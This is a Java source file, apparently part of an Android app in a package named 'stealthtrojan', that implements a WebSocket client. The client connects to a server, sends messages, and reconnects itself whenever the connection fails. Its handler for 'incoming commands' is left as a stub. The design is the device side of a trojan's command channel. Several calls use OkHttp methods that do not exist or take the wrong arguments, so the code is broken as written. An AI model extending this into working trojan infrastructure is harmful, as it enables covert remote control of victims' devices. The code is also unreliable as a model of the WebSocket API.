package com.stealthtrojan.app;

import android.util.Log;
import okhttp3.OkHttpClient;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.BufferedSink;

import java.util.concurrent.TimeUnit;

public class WebSocketClient extends WebSocketListener {
    private static final String TAG = "WebSocketClient";
    private static final String SERVER_URL = "ws://localhost:8000/ws/device";
    private WebSocket ws;

    private static WebSocketClient instance;

    public static WebSocketClient getInstance() {
        if (instance == null) {
            instance = new WebSocketClient();
        }
        return instance;
    }

    public void connect() {
        OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .build();

        ws = client.newWebSocket(
            new okhttp3.Request.Builder()
                .url(SERVER_URL)
                .build(),
            this
        );
    }

    public void sendMessage(String message) {
        if (ws != null) {
            BufferedSink sink = ws.writer()
                .buffer()
                .writeUtf8(message)
                .writeByte('\n')
                .close();
            sink.flush();
            Log.d(TAG, "Message sent: " + message);
        }
    }

    @Override
    public void onOpen(WebSocket ws, okhttp3.Response response) {
        Log.d(TAG, "WebSocket connected");
    }

    @Override
    public void onMessage(WebSocket ws, String message) {
        Log.d(TAG, "Message received from server: " + message);
        // Process incoming commands
        // ...
    }

    @Override
    public void onFailure(WebSocket ws, Throwable t, okhttp3.Response response) {
        Log.e(TAG, "WebSocket connection failed", t);
        // Reconnect logic
        ws.close();
        connect();
    }

    @Override
    public void onClose(WebSocket ws, int code, String reason) {
        Log.d(TAG, "WebSocket closed: " + code + " - " + reason);
    }
}
